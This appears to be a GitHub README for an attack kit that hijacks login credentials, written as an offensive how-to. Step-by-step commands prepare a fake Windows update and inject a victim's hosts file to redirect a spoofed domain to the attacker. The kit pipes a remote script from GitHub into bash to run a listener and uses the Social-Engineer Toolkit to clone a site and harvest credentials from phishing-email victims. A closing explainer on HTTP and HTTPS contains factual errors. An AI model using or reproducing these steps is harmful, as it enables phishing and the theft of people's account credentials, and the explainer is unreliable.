# SSTC-Social Security Tracking Connections-HTTPS-hijack-login-credentials 
- by nu11secur1ty

## The Latest information:
<details>
  <summary>Click to read the latest news!</summary>
  
## 2022
- Soon with more stable and flexible techniques that will bypass Windows Defender and more... =)
- BR
</details>


![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/hijacking.jpg)
=======================================================================================================


***Installing requirements and tools:***

-  [git](https://github.com/trustedsec/social-engineer-toolkit)

-  [curl](https://curl.haxx.se/)

-  [apache2](https://httpd.apache.org/docs/2.4/howto/public_html.html)

-  [SOCIAL-ENGINEER TOOLKIT (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

-  [Python](https://www.python.org/)

-  [Kali Linux](https://www.kali.org/) 


------------------------------------------------------------

# Exploit steps:
- PWN OS HTTPS hijacking

1. - Preparing a fake update for the victim:
```bash
git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
bash sh1m@zu.sh
[1]
     enter
```

2. - Preparing your hosts-file for exploiting of the victim:
     
     // fakesite.login.com

```bash
cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject

bash fakehost.sh
     
     # NOTE: You should set up your Network setup to STATIC!
     
     # For example:
     # with IP 10.10.10.100 or 192.168.1.100
     # Or it'd depend from the local network in leyar2
     # WARNING: The host_injector is working only with these IP's from A class of networks
     //10.10.10.100// and //192.168.1.100//
     
     type the attacker IP 10.10.10.100 # or 192.168.1.100
     
     type the fake domain microsoft.update.com
     
     enter
```
3. - Sending an email or an extra lure on your victim to injecting her `hosts` file.


- **conclusion** and ***NOTE:*** This is the DNS attack which using an injection method against the victim hosts file.
        In that way, the victim will never know what actually opening on the browser when clicking on your link. The idea is         when the victim clicks on your link and opens the browser is not to see your IP
        and to see what you want to do it. When the victim opens your `fake domain` no matter what protocol is using `HTTP`         or `HTTPS`. The victim will never understand what actually is hidden behind this domain. ;)
```
Тhat's the hardest part ;)
I will give you a decision soon, but until then you should create your own!
There is no easy things in this world. ;)
```
4. - Listening for victim visiting

```bash
     curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/Hijack-HTTPS-Listener/kazkuvgluvutu.sh | bash
```

5. - After exploiting the victim you should ***Stop Apache2***
```bash
systemct stop apache2.service
```
-------------------------------------------------------------

***SECOND PART***

1. - setoolkit cloning of real website
```bash
setoolkit
1) Social-Engineering Attacks
     set>1
     enter
2) Website Attack Vectors
     set>2
     enter
3) Credential Harvester Attack Method
     set:webattack>3
     enter
2) Site Cloner
     set:webattack>2
     enter
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
     enter
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: _your_site_
     enter
     enter
```

2. - Sending a hijack email of the victim.

[![](https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/blob/master/logo/fish.png)](https://www.youtube.com/watch?v=943zS0i1GJE)


3. - Receiving the hits from browser of the victim

-----------------------------------------------------------

# Understanding of Web Protocols - HTTP and HTTPS

Do you know that 68% of internet users believe that current laws for protecting their rights are not good enough?

Every time Google introduces a new preference, the internet takes/ is forced to note. Something similar happened when Google announced that websites with SSL Certificate / HTTPS protocol will be preferred in search engine results. I will try to cover the fundamentals of HTTP and HTTPS protocols

Before we dive deeper into understanding about HTTP and HTTPS protocol, let’s try to understand the meaning of the word protocol. 


# What is HTTP?

HTTP is Hypertext transfer protocol. Simply put - Rules to sending and receiving text-based messages. As we all know, computers work in a language of 1's and 0's i.e. Binary language. Therefore, potentially every set of 1's and 0's construct something, it could be a word.

Let's say I want to write 'a'. Now, if 0 stands for 'a', 1 stands for 'b', and 01 stands for 'c', I can infer that a combination of 0's and 1's can construct a word as well. In this case, the text is already constructed and is being sent on the wire. The computer works on many languages - pure binary, text and some other formats like byte codes. Here, what is being transferred is text. I am emphasizing on 'text' because this text is interpreted by the browser and the moment browser interprets it, it becomes hypertext, and the protocol that transfers the text is referred to as hypertext transfer protocol - HTTP.

Using HTTP, you can definitely transfer images and text and even sound, but not videos.

# What is HTTPS?

Hyper Text Transfer Protocol Secure (HTTPS) is the secure version of HTTP, the protocol over which data is sent between your browser and the website that you are connected to. The 'S' at the end of HTTPS stands for 'Secure'. It means all communications between your browser and the website are encrypted. HTTPS is often used to protect highly confidential online transactions like online banking and online shopping order forms.

---------------------------------------------------------------------------------------

# What is the importance of HTTPS?

We agreed upon the fact that what is being transferred from one point to another is text. To understand why HTTPS protocol, we first should know how wi-fi routers function.Let's say you are at an airport and you are connecting to the wi-fi which is the property of a third party. Now, when you are communicating over HTTP, the text is being transferred by their router. And if I go to a low version of the router, I can comfortably check and read the text that is being transferred. There could be a password that I can use to login to your bank site and do a fraudulent transaction!. Point being - this is fundamentally insecure. This is called the man in the middle attack. 

And this why do we need https when HTTP seems to suffice.


- Encryption and Encryption Levels

Encryption is simple terms is a hiding information. There are various ways to do so. You must have heard these terms - 128 bit encrypt HTTPS and 64 bit encrypt HTTPS. 128-bit Encrypt is a high encryption technique and it's very difficult to decrypt (decode). In the case of HTTPS when the data is being transferred on the wires, the man in the middle may still know what is being transferred, but can not make sense out of it as the data is encrypted. Only the browser will decrypt it and show it, and the server will decrypt it and use it for transactions.

For the curious one’s - There also happens to be a movie on encryption, Imitation Games. The entire plot of the movie was based on decrypting the German codes, which were to reform the entire course of the war. Those codes were very difficult to decrypt, but how Alan Turing finally does it.
How does this happens when you request to open a site in a browser?

To understand this, let us imagine that there is one Server that resides somewhere serving all the request for one domain. Now, when I type xyz.com, it's a server that I am connecting to, taking data from and rendering it in the browser.

To simplify further, imagine a domain name google.com being broadcasted from one server. There resides one machine somewhere connected to the internet and the moment you say google.com in your browser, you connect to that machine, pick data from that machine and show it in the browser. If you have saved your picture, it gets uploaded to that machine. Now, if you want to see that picture, you go to google.com/show-me-my-picture, which transfers the picture from the machine to the browser to be shown to you.

This process cannot be completed if I am not able to reach that particular machine. For this to happen, every machine has an address (the way we have a mobile number), it is called the IP address and every domain has an IP map. The moment you enter this user-friendly URL - google.com, it converts this username into IP and connects to the router to reach out to that particular service line associated with this URL. Once it reaches to the server, it raises a request of what is needed. It is represented as 'google.com/s=', helping the user understand the request made by him. As a result, the server gives him the results according to your request, which gets rendered to the browser.
Now, to save our data from such attacks, we need to encrypt that data.

# Conclusion
This is the point of SSL, to prevent this kind of unauthorized snooping. To authorize your proxy you need to tell the device to trust the proxy certificate, and tell the device clients to trust your certificate or use the devices private key, which it sounds like you don't have access to. For more information: 

https://en.wikipedia.org/wiki/Transport_Layer_Security

# BR

